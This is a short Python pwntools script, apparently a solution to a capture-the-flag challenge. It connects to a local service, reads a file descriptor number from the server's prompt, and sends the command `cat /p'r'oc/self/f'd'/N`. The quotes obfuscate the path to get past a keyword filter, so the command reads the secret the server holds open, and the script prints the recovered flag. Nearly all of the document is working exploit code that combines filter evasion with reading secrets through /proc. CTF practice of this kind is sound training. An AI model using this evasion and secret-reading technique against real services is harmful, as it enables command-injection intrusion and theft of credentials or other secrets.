from pwn import *
import re

def solve():
    # Use remote("127.0.0.1", 4444) for local Docker testing
    io = remote("127.0.0.1", 4444)

    # Read the prompt up to the command input
    prompt = io.recvuntil(b"Enter a command to run (max 32 chars):").decode()

    # Use Regex to dynamically find the File Descriptor number assigned by the OS
    match = re.search(r"\(FD (\d+)\)", prompt)
    if not match:
        print("[!] Could not find FD number in the server prompt!")
        return

    fd_num = match.group(1)
    print(f"[*] Server loaded secret into File Descriptor: {fd_num}")

    # Construct the dynamic payload
    payload = f"cat /p'r'oc/self/f'd'/{fd_num}".encode()

    print(f"[*] Sending payload: {payload.decode()}")
    io.sendline(payload)

    # Wait for the confirmation line, then read the line immediately after it
    io.recvuntil(b"[*] Executing:")
    io.recvline()

    # Extract the flag!
    flag = io.recvline().decode().strip()

    print(f"[+] Exploit successful! Flag: {flag}")
    io.close()

if __name__ == "__main__":
    solve()
